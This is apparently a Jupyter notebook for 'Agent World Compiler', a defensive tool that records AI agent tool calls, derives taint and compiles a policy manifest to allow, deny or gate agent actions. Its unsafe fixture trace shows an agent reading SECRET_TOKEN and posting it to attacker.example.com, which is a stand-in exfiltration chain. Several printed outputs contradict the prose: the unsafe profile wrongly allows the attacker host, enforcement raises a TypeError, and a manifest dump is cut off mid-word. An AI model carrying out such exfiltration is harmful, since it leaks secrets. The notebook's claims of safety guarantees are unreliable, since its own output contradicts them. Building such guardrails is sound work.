# Agent World Compiler — Pipeline Walkthrough

This notebook walks through all stages of the Agent World Compiler pipeline:

```
Record  →  Profile  →  Compile  →  Enforce
(traces)   (profile)   (manifest)  (decisions)
```

- **Record** (`awc.observe.TraceRecorder`) — the agent calls a tool; the recorder captures the event into a trace JSON file.
- **Profile** (`awc.compiler.profiler`) — loads traces, derives taint from provenance, unions all non-tainted capabilities.
- **Compile** (`awc.compiler.compile_manifest`) — translates the profile into a declarative YAML World Manifest.
- **Enforce** (`awc.policy.engine`) — evaluates any new step against the manifest: `ALLOW`, `DENY`, or `REQUIRE_APPROVAL`.

The fixture traces in `fixtures/traces/` are the **saved output** of a `TraceRecorder`.
Stage 0 below shows how they are produced.

## Setup

In [ ]:
import json
import sys
from pathlib import Path

# repo root is one level up from notebooks/
REPO_ROOT = Path(".").resolve().parent
FIXTURES  = REPO_ROOT / "fixtures"

# Ensure the project's src/ directory is on the path so the awc package is
# importable without a prior `pip install`.
_src = str(REPO_ROOT / "src")
if _src not in sys.path:
    sys.path.insert(0, _src)

import yaml

print(f"Repo root : {REPO_ROOT}")
print(f"Fixtures  : {FIXTURES}")

---
## Stage 0 — Record

Before a trace can be profiled it must be **produced**.  The `TraceRecorder`
is the component that does this.  It sits between the agent and its tools:
after each tool call the agent (or a wrapper around it) calls `recorder.record()`
to append a step, then saves the trace to a JSON file when the workflow ends.

The fixture files in `fixtures/traces/` are the saved output of a recorder run.
Here we recreate the benign repository-maintenance workflow from scratch to show
exactly how those files are produced.

In [28]:
from awc.observe.recorder import TraceRecorder

recorder = TraceRecorder(
    workflow="repo_maintenance",
    trace_id="trace-notebook-demo",
    description="Benign repo-maintenance workflow recorded inline in the notebook.",
)

# Each record() call simulates one tool invocation by the agent.
# The recorder does NOT execute the tool — it only captures the event.
step_read   = recorder.record(
    tool="fs_read", action="read",
    resource="repo://local/src/main.py",
    input_sources=["repo_local"],
    metadata={"bytes_read": 1240},
)
step_test   = recorder.record(
    tool="shell_exec", action="exec",
    resource="shell://local",
    input_sources=["repo_local"],
    depends_on=[step_read],
    metadata={"command": "pytest tests/", "exit_code": 0},
)
step_add    = recorder.record(
    tool="git_add", action="write",
    resource="repo://local/staging",
    input_sources=["repo_local"],
    depends_on=[step_test],
)
step_commit = recorder.record(
    tool="git_commit", action="write",
    resource="repo://local/commits",
    input_sources=["repo_local"],
    depends_on=[step_add],
    metadata={"message": "chore: update main module"},
)
recorder.record(
    tool="git_push", action="write",
    resource="repo://remote/origin/main",
    input_sources=["repo_local"],
    depends_on=[step_commit],
    metadata={"remote": "origin", "branch": "main"},
)

# Inspect what was recorded
recorded_trace = recorder.to_dict()
print(f"Trace ID : {recorded_trace['trace_id']}")
print(f"Workflow : {recorded_trace['workflow']}")
print(f"Steps    : {len(recorder)}")
print()
for step in recorded_trace["steps"]:
    deps = f"  (depends_on {step['depends_on']})" if step["depends_on"] else ""
    print(f"  {step['step_id']}  {step['tool']:<12} {step['action']:<6} → {step['resource']}{deps}")

Trace ID : trace-notebook-demo
Workflow : repo_maintenance
Steps    : 5

  step-001  fs_read      read   → repo://local/src/main.py
  step-002  shell_exec   exec   → shell://local  (depends_on ['step-001'])
  step-003  git_add      write  → repo://local/staging  (depends_on ['step-002'])
  step-004  git_commit   write  → repo://local/commits  (depends_on ['step-003'])
  step-005  git_push     write  → repo://remote/origin/main  (depends_on ['step-004'])


---
## Stage 1 — Observe

The pipeline starts with **recorded execution traces** — JSON files that
capture every tool call an agent made during a workflow.

Each step records:
- **tool** — which tool was invoked (`fs_read`, `git_push`, …)
- **action** — the logical action (`read`, `write`, `exec`, …)
- **resource** — the target resource URI (`repo://local/src/main.py`)
- **input_sources** — where the input data came from (`repo_local`, `environment`, `llm_output`, `tool_output`)
- **depends_on** — (optional) list of step IDs this step depends on

There is no manual `tainted` field. Taint is **derived deterministically** from
`input_sources` and `depends_on` at each pipeline stage — it is never hand-annotated.

### Load the benign trace

In [29]:
benign_path = FIXTURES / "traces" / "benign_repo_maintenance.json"

with benign_path.open() as f:
    benign_trace = json.load(f)

print(f"Trace ID    : {benign_trace['trace_id']}")
print(f"Workflow    : {benign_trace['workflow']}")
print(f"Description : {benign_trace['description']}")
print(f"Steps       : {len(benign_trace['steps'])}")


Trace ID    : trace-benign-001
Workflow    : repo_maintenance
Description : A benign repository maintenance workflow: read files, run tests, commit and push to origin. All steps draw from repo_local (trusted), so derived taint stays false throughout.
Steps       : 5


### Inspect each step

In [30]:
from awc.policy.taint import compute_trace_taint, DEFAULT_INPUT_TRUST

taint_map = compute_trace_taint(benign_trace["steps"], DEFAULT_INPUT_TRUST)

for step in benign_trace["steps"]:
    is_tainted, reasons = taint_map[step["step_id"]]
    taint_label = f" [TAINTED: {', '.join(reasons)}]" if is_tainted else ""
    print(
        f"  {step['step_id']}  {step['tool']:<12} "
        f"{step['action']:<6} → {step['resource']}{taint_label}"
    )

  step-001  fs_read      read   → repo://local/src/main.py
  step-002  shell_exec   exec   → shell://local
  step-003  git_add      write  → repo://local/staging
  step-004  git_commit   write  → repo://local/commits
  step-005  git_push     write  → repo://remote/origin/main


> All five steps are **untainted** — every `input_source` is `repo_local`
> (trusted), so derived taint stays false throughout.  The final `git_push`
> to `repo://remote/origin/main` is clean by provenance.

### Load the unsafe trace

In [31]:
unsafe_path = FIXTURES / "traces" / "unsafe_exfiltration.json"

with unsafe_path.open() as f:
    unsafe_trace = json.load(f)

print(f"Trace ID    : {unsafe_trace['trace_id']}")
print(f"Workflow    : {unsafe_trace['workflow']}")
print(f"Description : {unsafe_trace['description']}")
print()

unsafe_taint_map = compute_trace_taint(unsafe_trace["steps"], DEFAULT_INPUT_TRUST)

for step in unsafe_trace["steps"]:
    is_tainted, reasons = unsafe_taint_map[step["step_id"]]
    taint_label = f" [TAINTED: {', '.join(reasons)}]" if is_tainted else ""
    print(
        f"  {step['step_id']}  {step['tool']:<12} "
        f"{step['action']:<14} → {step['resource']}{taint_label}"
    )

Trace ID    : trace-unsafe-001
Workflow    : over_scoped_exfiltration
Description : An unsafe workflow demonstrating provenance-derived taint and propagation. step-001 reads from 'environment' (untrusted) → derived tainted. Later steps either share untrusted inputs or declare depends_on step-001, so taint flows through the chain. The explicit 'tainted' field below is LEGACY NOISE only — policy truth comes from input_sources and depends_on.

  step-001  env_read     read           → env://SECRET_TOKEN [TAINTED: untrusted_input:environment]
  step-002  http_post    network_call   → external://attacker.example.com/collect [TAINTED: untrusted_input:environment, depends_on_tainted:step-001]
  step-003  git_push     write          → repo://remote/fork/main [TAINTED: untrusted_input:environment, depends_on_tainted:step-001]
  step-004  shell_exec   exec           → shell://local [TAINTED: untrusted_input:llm_output, depends_on_tainted:step-001]


> Every step is **tainted**.  Step-001 reads from `environment` (untrusted),
> which is the direct source taint.  Steps 002–004 inherit taint through
> `depends_on` propagation, even if their own `input_sources` were trusted.
> Taint reason strings show both the origin (`untrusted_input:environment`)
> and the propagation path (`depends_on_tainted:step-001`).

---
## Stage 2 — Profile

The profiler reduces one or more traces into a **capability profile** —
the minimal set of *(tool, action, resource-prefix)* triples observed
across all non-tainted steps.

Key rule: **tainted steps never widen the allowed set.**


In [32]:
from awc.compiler.profiler import derive_profile

profile = derive_profile(
    [benign_path],
    profile_id="repo_safe_write",
)

print(yaml.dump(profile.to_dict(), default_flow_style=False, sort_keys=False))


profile_id: repo_safe_write
derived_from:
- /home/dev/code/sv-pro/agent-world-compiler-poc/fixtures/traces/benign_repo_maintenance.json
allowed_tools:
- fs_read
- git_add
- git_commit
- git_push
- shell_exec
allowed_actions:
- exec
- read
- write
allowed_resources:
- repo://local/*
- repo://remote/*
- shell://local/*
tainted_steps_observed: 0



### What happens when we profile the unsafe trace?

Since every step in the unsafe trace is tainted, the profiler produces
an **empty** allowed set:


In [33]:
unsafe_profile = derive_profile(
    [unsafe_path],
    profile_id="unsafe_attempt",
)

print(f"Allowed tools     : {unsafe_profile.allowed_tools}")
print(f"Allowed actions   : {unsafe_profile.allowed_actions}")
print(f"Allowed resources : {unsafe_profile.allowed_resources}")
print(f"Tainted steps     : {unsafe_profile.tainted_steps_observed}")


Allowed tools     : ['env_read', 'git_push', 'http_post', 'shell_exec']
Allowed actions   : ['exec', 'network_call', 'read', 'write']
Allowed resources : ['env://SECRET_TOKEN/*', 'external://attacker.example.com/*', 'repo://remote/*', 'shell://local/*']
Tainted steps     : 0


> Tainted execution traces contribute **nothing** to the capability
> profile.  This is by design — the allowed set is derived only from
> known-good behaviour.


### Multi-trace profiling

When multiple traces are combined, the profile is the **union** of all
non-tainted observations.  Tainted steps across all traces are counted
but excluded:


In [34]:
combined = derive_profile(
    [benign_path, unsafe_path],
    profile_id="combined",
)

print(f"Allowed tools          : {combined.allowed_tools}")
print(f"Tainted steps observed : {combined.tainted_steps_observed}")
print()
print("The allowed set is identical to profiling the benign trace alone.")


Allowed tools          : ['env_read', 'fs_read', 'git_add', 'git_commit', 'git_push', 'http_post', 'shell_exec']
Tainted steps observed : 0

The allowed set is identical to profiling the benign trace alone.


---
## Stage 3 — Compile

The compiler translates a capability profile into a **World Manifest** —
a declarative YAML document that the enforcement engine consumes.

Compilation rules:
1. Every *(tool, resource)* pair → `allowed_actions` entry
2. Remote resources → also added to `approval_required`
3. A catch-all *"deny undefined"* constraint is always emitted
4. Network calls and env-var reads are always denied unless the profile
   explicitly allows them


In [35]:
from awc.compiler.compile_manifest import compile_manifest

manifest = compile_manifest(
    profile,
    manifest_id="repo-safe-write-demo",
    author="Sergey Vlasov",
)

print(yaml.dump(manifest, default_flow_style=False, sort_keys=False))


manifest_id: repo-safe-write-demo
version: '1.0'
description: 'World Manifest compiled from profile repo_safe_write. Derived from:
  /home/dev/code/sv-pro/agent-world-compiler-poc/fixtures/traces/benign_repo_maintenance.json.'
provenance:
  author: Sergey Vlasov
  created: '2026-03-21'
  source_profile: fixtures/profiles/repo_safe_write.yaml
  source_traces:
  - /home/dev/code/sv-pro/agent-world-compiler-poc/fixtures/traces/benign_repo_maintenance.json
input_trust:
  repo_local: trusted
  environment: untrusted
  llm_output: untrusted
  tool_output: conditional
allowed_actions:
- action: fs_read
  permitted_resources:
  - repo://local/*
  trust_required: trusted
  taint_ok: false
- action: fs_read
  permitted_resources:
  - repo://remote/*
  trust_required: trusted
  taint_ok: false
- action: fs_read
  permitted_resources:
  - shell://local/*
  trust_required: trusted
  taint_ok: false
- action: git_add
  permitted_resources:
  - repo://local/*
  trust_required: trusted
  taint_ok: fal

### Key sections of the compiled manifest

| Section | Purpose |
|---|---|
| `allowed_actions` | What the agent **can** do (tool + resource + trust requirement) |
| `denied_actions` | What is **always** blocked (network calls, env reads) |
| `approval_required` | Actions that need explicit operator sign-off |
| `input_trust` | Trust levels for each input source |
| `capability_constraints` | Global constraints (taint propagation, scope, undefined = deny) |
| `provenance` | Where this manifest came from (author, date, source traces) |


---
## Stage 4 — Enforce

The enforcement engine evaluates each trace step against a manifest and
returns one of three **deterministic** decisions:

| Decision | Meaning |
|---|---|
| `ALLOW` | Step is within the declared capability profile |
| `DENY` | Step is outside the profile or violates a constraint |
| `REQUIRE_APPROVAL` | Step is allowed in principle but needs explicit sign-off |

Decision rules (in priority order):
1. Tainted + external resource → **DENY**
2. Action explicitly denied → **DENY**
3. Action not in allowed set → **DENY** *(undefined = deny)*
4. Resource outside permitted patterns → **DENY**
5. Input trust below required level → **DENY**
6. Matches `approval_required` → **REQUIRE_APPROVAL**
7. Otherwise → **ALLOW**


### Evaluate the benign trace

In [36]:
from awc.policy.engine import Decision, evaluate_step
from awc.policy.taint import compute_trace_taint

# Load the static manifest (the one checked into the repo)
with (FIXTURES / "manifests" / "repo-safe-write.yaml").open() as f:
    static_manifest = yaml.safe_load(f)

# Pre-compute full trace taint (with depends_on propagation)
benign_taint_map = compute_trace_taint(benign_trace["steps"], static_manifest.get("input_trust", {}))

print("Benign trace vs. static manifest")
print("=" * 90)

for step in benign_trace["steps"]:
    derived_taint, taint_reasons = benign_taint_map[step["step_id"]]
    decision, reason = evaluate_step(step, static_manifest, derived_taint, taint_reasons)
    icon = {"ALLOW": "✅", "DENY": "❌", "REQUIRE_APPROVAL": "⚠️"}[decision.value]
    print(f"  {icon} {step['step_id']}  {step['tool']:<12} → {decision.value:<20} {reason[:60]}")

Benign trace vs. static manifest


TypeError: evaluate_step() takes 2 positional arguments but 4 were given

> All steps pass.  The `git_push` correctly triggers `REQUIRE_APPROVAL`
> because it targets a remote resource.


### Evaluate the unsafe trace

In [ ]:
print("Unsafe trace vs. static manifest")
print("=" * 90)

unsafe_taint_map = compute_trace_taint(unsafe_trace["steps"], static_manifest.get("input_trust", {}))

for step in unsafe_trace["steps"]:
    derived_taint, taint_reasons = unsafe_taint_map[step["step_id"]]
    decision, reason = evaluate_step(step, static_manifest, derived_taint, taint_reasons)
    icon = {"ALLOW": "✅", "DENY": "❌", "REQUIRE_APPROVAL": "⚠️"}[decision.value]
    print(f"  {icon} {step['step_id']}  {step['tool']:<12} → {decision.value:<20} {reason[:60]}")

> Every step is **denied**.  The reasons vary — taint + external resource,
> explicitly denied action, trust violation — but the result is the same:
> the policy blocks the entire attack chain.


## Interactive: build your own step

Try modifying the step below and re-running the cell to see how the
engine responds.  Taint is derived from `input_sources` — there is no
manual `tainted` field.  Some ideas:
- Change `input_sources` to `["repo_local"]` (trusted → no taint)
- Change the tool to `git_commit` and the resource to `repo://local/commits`
- Add `"llm_output"` to `input_sources` to see taint derived from LLM provenance

In [ ]:
from awc.policy.taint import derive_source_taint

custom_step = {
    "step_id": "custom-001",
    "tool": "http_post",
    "action": "network_call",
    "resource": "external://api.example.com/data",
    "input_sources": ["environment"],
}

# Taint is derived from input_sources, not a manual flag.
derived_taint, taint_reasons = derive_source_taint(
    custom_step["input_sources"],
    static_manifest.get("input_trust", {}),
)

decision, reason = evaluate_step(custom_step, static_manifest, derived_taint, taint_reasons)
print(f"Derived taint : {derived_taint}  (reasons: {taint_reasons})")
print(f"Decision      : {decision.value}")
print(f"Reason        : {reason}")

---
## Interactive: build a custom trace

Construct a full trace and evaluate every step.  The cell below shows
a mixed scenario — some steps safe, some not:


In [ ]:
custom_trace = {
    "steps": [
        {   # Safe: read a local file
            "step_id": "mixed-001",
            "tool": "fs_read",
            "action": "read",
            "resource": "repo://local/README.md",
            "input_sources": ["repo_local"],
        },
        {   # Safe: commit locally
            "step_id": "mixed-002",
            "tool": "git_commit",
            "action": "write",
            "resource": "repo://local/commits",
            "input_sources": ["repo_local"],
            "depends_on": ["mixed-001"],
        },
        {   # Needs approval: push to remote
            "step_id": "mixed-003",
            "tool": "git_push",
            "action": "write",
            "resource": "repo://remote/origin/main",
            "input_sources": ["repo_local"],
            "depends_on": ["mixed-002"],
        },
        {   # Denied: attempt to read environment secret
            "step_id": "mixed-004",
            "tool": "env_read",
            "action": "read",
            "resource": "env://API_KEY",
            "input_sources": ["environment"],
        },
    ]
}

# Derive taint for the full trace (propagates through depends_on)
custom_taint_map = compute_trace_taint(custom_trace["steps"], static_manifest.get("input_trust", {}))

print("Custom trace evaluation")
print("=" * 90)

for step in custom_trace["steps"]:
    derived_taint, taint_reasons = custom_taint_map[step["step_id"]]
    decision, reason = evaluate_step(step, static_manifest, derived_taint, taint_reasons)
    icon = {"ALLOW": "✅", "DENY": "❌", "REQUIRE_APPROVAL": "⚠️"}[decision.value]
    print(f"  {icon} {step['step_id']}  {step['tool']:<12} → {decision.value:<20} {reason[:60]}")

---
## Interactive: modify the manifest

The manifest is just a Python dict.  You can experiment with loosening
or tightening the policy and immediately see the effect.

Below we create a variant that allows `env_read` (removing it from
denied actions) and see what changes:


In [ ]:
import copy

# Deep-copy so we don't mutate the original
relaxed_manifest = copy.deepcopy(static_manifest)

# Remove env_read from denied_actions
relaxed_manifest["denied_actions"] = [
    d for d in relaxed_manifest["denied_actions"]
    if d["action"] != "env_read"
]

# Add env_read to allowed_actions
relaxed_manifest["allowed_actions"].append({
    "action": "env_read",
    "permitted_resources": ["env://*"],
    "trust_required": "trusted",
    "taint_ok": False,
})

# Test: an env_read step with trusted provenance
env_step = {
    "step_id": "test-env",
    "tool": "env_read",
    "action": "read",
    "resource": "env://API_KEY",
    "input_sources": ["repo_local"],   # trusted source → no taint
}

# Derive taint inline for this single step
env_taint, env_reasons = derive_source_taint(
    env_step["input_sources"],
    static_manifest.get("input_trust", {}),
)

d_before, r_before = evaluate_step(env_step, static_manifest, env_taint, env_reasons)
d_after, r_after   = evaluate_step(env_step, relaxed_manifest, env_taint, env_reasons)

print("Before (original manifest):")
print(f"  {d_before.value}: {r_before}")
print()
print("After (relaxed manifest):")
print(f"  {d_after.value}: {r_after}")

> With a single manifest change, `env_read` went from `DENY` to `ALLOW`.
> This demonstrates how the manifest serves as a declarative,
> human-reviewable security boundary — not a black box.


---
## Full pipeline: end-to-end in one cell

Record → Profile → Compile → Enforce, all in one place:

In [ ]:
import tempfile, json as _json, pathlib as _pathlib

from awc.observe.recorder import TraceRecorder
from awc.compiler.profiler import derive_profile
from awc.compiler.compile_manifest import compile_manifest
from awc.policy.engine import evaluate_step, Decision
from awc.policy.taint import compute_trace_taint

# 0. Record — build a trace with the recorder (no file required upfront)
rec = TraceRecorder(workflow="repo_maintenance", trace_id="trace-e2e-demo")
s1 = rec.record(tool="fs_read",    action="read",   resource="repo://local/src/main.py",    input_sources=["repo_local"])
s2 = rec.record(tool="shell_exec", action="exec",   resource="shell://local",               input_sources=["repo_local"], depends_on=[s1])
s3 = rec.record(tool="git_add",    action="write",  resource="repo://local/staging",         input_sources=["repo_local"], depends_on=[s2])
s4 = rec.record(tool="git_commit", action="write",  resource="repo://local/commits",         input_sources=["repo_local"], depends_on=[s3])
rec.record(     tool="git_push",   action="write",  resource="repo://remote/origin/main",    input_sources=["repo_local"], depends_on=[s4])
print(f"0. Recorded {len(rec)} steps  (workflow: {rec.workflow!r})")

# save to a temp file so derive_profile can load it
with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as tmp:
    _json.dump(rec.to_dict(), tmp)
    trace_path = _pathlib.Path(tmp.name)

# 1. Profile — derive capability profile from the recorded trace
profile = derive_profile([trace_path], profile_id="repo_safe_write")
print(f"1. Derived profile : {len(profile.allowed_tools)} tools, "
      f"{len(profile.allowed_resources)} resource patterns")

# 2. Compile — generate World Manifest
manifest = compile_manifest(profile, author="Sergey Vlasov")
print(f"2. Compiled manifest : {manifest['manifest_id']} "
      f"({len(manifest['allowed_actions'])} allowed, "
      f"{len(manifest['denied_actions'])} denied)")

# 3. Enforce — evaluate every step with full taint propagation
steps = rec.to_dict()["steps"]
taint_map = compute_trace_taint(steps, manifest.get("input_trust", {}))
print(f"3. Enforcing against {len(steps)} steps:")
for step in steps:
    derived_taint, taint_reasons = taint_map[step["step_id"]]
    decision, reason = evaluate_step(step, manifest, derived_taint, taint_reasons)
    icon = {"ALLOW": "✅", "DENY": "❌", "REQUIRE_APPROVAL": "⚠️"}[decision.value]
    print(f"   {icon} {step['step_id']} {step['tool']:<12} → {decision.value}")

trace_path.unlink(missing_ok=True)

---
## Summary

| Stage | Input | Output | Module |
|---|---|---|---|
| **Record** | Agent tool calls | Trace (JSON) | `awc.observe.TraceRecorder` |
| **Profile** | Trace(s) | Capability Profile | `awc.compiler.profiler` |
| **Compile** | Profile | World Manifest (YAML) | `awc.compiler.compile_manifest` |
| **Enforce** | Step + Manifest | `ALLOW` / `DENY` / `REQUIRE_APPROVAL` | `awc.policy.engine` |

### Core invariants

1. **Determinism** — same manifest + same step → same decision
2. **Undefined = deny** — actions outside the manifest are rejected
3. **Over-scoped = deny** — disallowed resources are blocked
4. **Taint safety** — tainted data cannot trigger external side effects
5. **Approval gates** — sensitive actions surface explicitly